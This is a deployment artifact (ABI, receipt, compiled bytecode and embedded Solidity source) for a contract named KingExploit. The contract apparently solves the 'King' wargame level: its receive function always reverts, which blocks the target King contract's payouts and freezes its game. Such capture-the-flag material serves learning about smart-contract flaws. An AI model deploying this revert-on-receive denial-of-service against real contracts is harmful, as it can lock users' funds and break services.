{
  "address": "0x487296fB885F48485f5B2D4204F106707c3123A3",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "receiver",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "sendFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "transactionHash": "0xde82f8b14e598b53c490fb5d70d568d27521a9b404af3d435b01924d49928648",
  "receipt": {
    "to": null,
    "from": "0xd7Dd548772fF126999a1a02640beFA34C2ce470B",
    "contractAddress": "0x487296fB885F48485f5B2D4204F106707c3123A3",
    "transactionIndex": 36,
    "gasUsed": "282437",
    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
    "blockHash": "0x4d98735e8a39cfd8f8bfd780b73b322ce08a91dba756e3372c2d20e8d6211792",
    "transactionHash": "0xde82f8b14e598b53c490fb5d70d568d27521a9b404af3d435b01924d49928648",
    "logs": [],
    "blockNumber": 8258886,
    "cumulativeGasUsed": "3954711",
    "status": 1,
    "byzantium": true
  },
  "args": [],
  "numDeployments": 1,
  "solcInputHash": "d5132143175bd35ffc74b5c57761b2c4",
  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"sendFunds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/King.sol\":\"KingExploit\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/King.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract King {\\n    address king;\\n    uint public prize;\\n    address public owner;\\n\\n    constructor() payable {\\n        owner = msg.sender;\\n        king = msg.sender;\\n        prize = msg.value;\\n    }\\n\\n    receive() external payable {\\n        require(msg.value >= prize || msg.sender == owner);\\n        payable(king).transfer(msg.value);\\n        king = msg.sender;\\n        prize = msg.value;\\n    }\\n\\n    function _king() public view returns (address) {\\n        return king;\\n    }\\n}\\n\\ncontract KingExploit {\\n    constructor() payable {}\\n\\n    function sendFunds(address receiver, uint256 amount) external {\\n        require(amount <= address(this).balance, \\\"insufficient balance\\\");\\n        (bool success, ) = payable(receiver).call{value: amount}(\\\"\\\");\\n        require(success, \\\"payment failed\\\");\\n    }\\n\\n    receive() external payable {\\n        revert(\\\"transfer error\\\");\\n    }\\n}\\n\",\"keccak256\":\"0xeba5fa8f31807b88c209bbbdd5c01ec811143487511c6339cd2ca063bdfff60b\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405261042e806100136000396000f3fe6080604052600436106100225760003560e01c80636f64234e1461006757610062565b36610062576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610059906101e1565b60405180910390fd5b600080fd5b34801561007357600080fd5b5061008e6004803603810190610089919061029a565b610090565b005b478111156100d3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100ca90610326565b60405180910390fd5b60008273ffffffffffffffffffffffffffffffffffffffff16826040516100f990610377565b60006040518083038185875af1925050503d8060008114610136576040519150601f19603f3d011682016040523d82523d6000602084013e61013b565b606091505b505090508061017f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610176906103d8565b60405180910390fd5b505050565b600082825260208201905092915050565b7f7472616e73666572206572726f72000000000000000000000000000000000000600082015250565b60006101cb600e83610184565b91506101d682610195565b602082019050919050565b600060208201905081810360008301526101fa816101be565b9050919050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061023182610206565b9050919050565b61024181610226565b811461024c57600080fd5b50565b60008135905061025e81610238565b92915050565b6000819050919050565b61027781610264565b811461028257600080fd5b50565b6000813590506102948161026e565b92915050565b600080604083850312156102b1576102b0610201565b5b60006102bf8582860161024f565b92505060206102d085828601610285565b9150509250929050565b7f696e73756666696369656e742062616c616e6365000000000000000000000000600082015250565b6000610310601483610184565b915061031b826102da565b602082019050919050565b6000602082019050818103600083015261033f81610303565b9050919050565b600081905092915050565b50565b6000610361600083610346565b915061036c82610351565b600082019050919050565b600061038282610354565b9150819050919050565b7f7061796d656e74206661696c6564000000000000000000000000000000000000600082015250565b60006103c2600e83610184565b91506103cd8261038c565b602082019050919050565b600060208201905081810360008301526103f1816103b5565b905091905056fea2646970667358221220ad2f3a37356aa65e934cafc6dbcfe1a092c28d52e50df0f3fb7235e308273e3664736f6c63430008110033",
  "deployedBytecode": "0x6080604052600436106100225760003560e01c80636f64234e1461006757610062565b36610062576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610059906101e1565b60405180910390fd5b600080fd5b34801561007357600080fd5b5061008e6004803603810190610089919061029a565b610090565b005b478111156100d3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100ca90610326565b60405180910390fd5b60008273ffffffffffffffffffffffffffffffffffffffff16826040516100f990610377565b60006040518083038185875af1925050503d8060008114610136576040519150601f19603f3d011682016040523d82523d6000602084013e61013b565b606091505b505090508061017f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610176906103d8565b60405180910390fd5b505050565b600082825260208201905092915050565b7f7472616e73666572206572726f72000000000000000000000000000000000000600082015250565b60006101cb600e83610184565b91506101d682610195565b602082019050919050565b600060208201905081810360008301526101fa816101be565b9050919050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061023182610206565b9050919050565b61024181610226565b811461024c57600080fd5b50565b60008135905061025e81610238565b92915050565b6000819050919050565b61027781610264565b811461028257600080fd5b50565b6000813590506102948161026e565b92915050565b600080604083850312156102b1576102b0610201565b5b60006102bf8582860161024f565b92505060206102d085828601610285565b9150509250929050565b7f696e73756666696369656e742062616c616e6365000000000000000000000000600082015250565b6000610310601483610184565b915061031b826102da565b602082019050919050565b6000602082019050818103600083015261033f81610303565b9050919050565b600081905092915050565b50565b6000610361600083610346565b915061036c82610351565b600082019050919050565b600061038282610354565b9150819050919050565b7f7061796d656e74206661696c6564000000000000000000000000000000000000600082015250565b60006103c2600e83610184565b91506103cd8261038c565b602082019050919050565b600060208201905081810360008301526103f1816103b5565b905091905056fea2646970667358221220ad2f3a37356aa65e934cafc6dbcfe1a092c28d52e50df0f3fb7235e308273e3664736f6c63430008110033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [],
    "types": null
  }
}